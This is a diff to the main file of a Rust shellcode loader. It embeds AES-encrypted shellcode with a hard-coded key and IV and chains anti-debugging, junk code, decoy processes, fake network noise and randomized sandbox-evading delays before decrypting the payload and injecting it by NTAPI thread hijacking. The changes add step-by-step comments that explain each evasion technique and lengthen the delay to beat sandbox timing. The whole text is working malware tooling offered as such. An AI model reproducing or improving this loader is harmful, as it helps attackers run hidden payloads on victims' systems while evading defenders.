@@ -1,13 +1,20 @@
+// === Loader Entry Point ===
+// Orchestrates anti-analysis routines, environmental noise, and shellcode execution via delayed thread hijacking
 //loader/src/main.rs
+
 use crate::{evasion::{anti_debug::encrypted_sleep, dead_code::generate_dead_code, fake_processes::{simulate_network_activity, spawn_decoy_processes_evasive}, flow::polymorphic_execute}, execute::thread_hijack::execute_delayed_thread_hijacking};
 
-// loader/src/main.rs
+// --- Internal modules ---
+// Each encapsulates specific responsibilities (evasion, decryption, thread injection, etc.)
 mod decrypt;
 mod execute;
 mod native;
 mod evasion;
 
-// 2. Définition du shellcode chiffré par AES-256-CBC
+// === Encrypted Payload Configuration ===
+
+// AES-256-CBC encrypted shellcode buffer
+// This is decrypted and executed later via thread hijacking
 static ENCRYPTED_SHELLCODE: &[u8] = &[0xbb,0x72,0xdb,0x3b,0xb2,0x84,0x37,0x2c,0xc6,0xde,0x91,0x67,
     0x47,0xe6,0x67,0x74,0x1f,0xd5,0x5c,0x03,0xb9,0xd2,0xfd,0x68,
     0xa5,0x3c,0x99,0x81,0x35,0x42,0x5e,0x21,0x7b,0x1d,0x6d,0x2c,
@@ -48,6 +55,8 @@ static ENCRYPTED_SHELLCODE: &[u8] = &[0xbb,0x72,0xdb,0x3b,0xb2,0x84,0x37,0x2c,0x
     0x41,0x19,0xf0,0x1e,0x32,0x34,0xff,0xc9,0xe6,0x30,0xdc,0x25,
     0x9b,0x58,0xd5,0xf5,0x46,0xce,0x29,0x5e];
 
+// Static 256-bit AES encryption key
+// Ideally should be obfuscated or derived at runtime to avoid static extraction
 static ENCRYPTION_KEY: [u8; 32] = [
     0x15, 0x73, 0x09, 0x21, 0x2c, 0x4d, 0x27, 0x0c,
     0x12, 0xf5, 0x3c, 0x43, 0xfd, 0xec, 0x4c, 0x93,
@@ -55,57 +64,75 @@ static ENCRYPTION_KEY: [u8; 32] = [
     0x37, 0xc3, 0xf9, 0x51, 0x2d, 0xd1, 0x2a, 0x65,
 ];
 
+
+// Static 128-bit AES IV (CBC mode)
 static ENCRYPTION_IV: [u8; 16] = [
     0xef, 0xba, 0x75, 0x8b, 0x1c, 0x81, 0xe5, 0xcc,
     0xe8, 0xf5, 0x3e, 0x0b, 0x76, 0xec, 0x87, 0xc7,
 ];
 
-// 3. Fonction principale
+// === Main Execution ===
+// Applies multiple evasion layers before executing decrypted payload
 fn main() -> Result<(), Box<dyn std::error::Error>> {
 
+    // Step 1: Anti-debugging — abort early if debugger is detected
     if evasion::anti_debug::check_debugger() {
         println!("Débogueur détecté ! Arrêt de l'exécution.");
         return Ok(());
     }
 
+    // Step 2: Inject dead code (junk logic to confuse disassemblers)
     generate_dead_code();
 
+    // Step 3: Spawn fake system processes to simulate legitimate activity
     spawn_decoy_processes_evasive();
 
+    // Step 4: Simulate benign network behavior (e.g., DNS lookups)
     simulate_network_activity();
 
+    // Step 5: Randomized delay before payload delivery
+    // Adds variability to execution time (evasion of sandbox timing)
     let wait_time = {
         use rand::Rng;
-        rand::thread_rng().gen_range(3..9)
+        rand::thread_rng().gen_range(8..20)
     };
 
     for i in 0..wait_time {
+        // Optionally inject more dead code during wait
         if i % 10 == 0 {
             generate_dead_code();
         }
-        encrypted_sleep(1000);   
+        encrypted_sleep(1000);   // Sleep 1 second per iteration
     }
 
+    // Step 6: Polymorphic execution wrapper (flow obfuscation)
+    // Randomizes how the payload is delivered (recursion, fake errors, etc.)
     polymorphic_execute(|| {
         let _ = execute_real_logic();
     });
     
-    // ÉTAPE 6: Nettoyage avec plus de bruit
-    spawn_decoy_processes_evasive(); // Encore des processus
+    // Step 7: Final stage noise — spawn more decoy processes post-payload
+    spawn_decoy_processes_evasive(); 
     
     Ok(())   
 }
 
+// === Core Payload Execution ===
+// Decrypts and injects shellcode via delayed thread hijacking (NTAPI-based)
+
 pub fn execute_real_logic() -> Result<(), Box<dyn std::error::Error>> {
     
+    // Dynamically resolve all required NTAPI function pointers
     let native_api = native::call::NativeAPI::new()?;
 
+    // Execute shellcode via remote thread hijacking
     match unsafe { execute_delayed_thread_hijacking(&native_api, 
         ENCRYPTED_SHELLCODE, &ENCRYPTION_KEY, &ENCRYPTION_IV) } {
         Ok(_) => {
             return Ok(());
         }
         Err(e) => {
+            // Error is silently ignored — intentionally avoids raising noise
             Ok(())
         }
     }
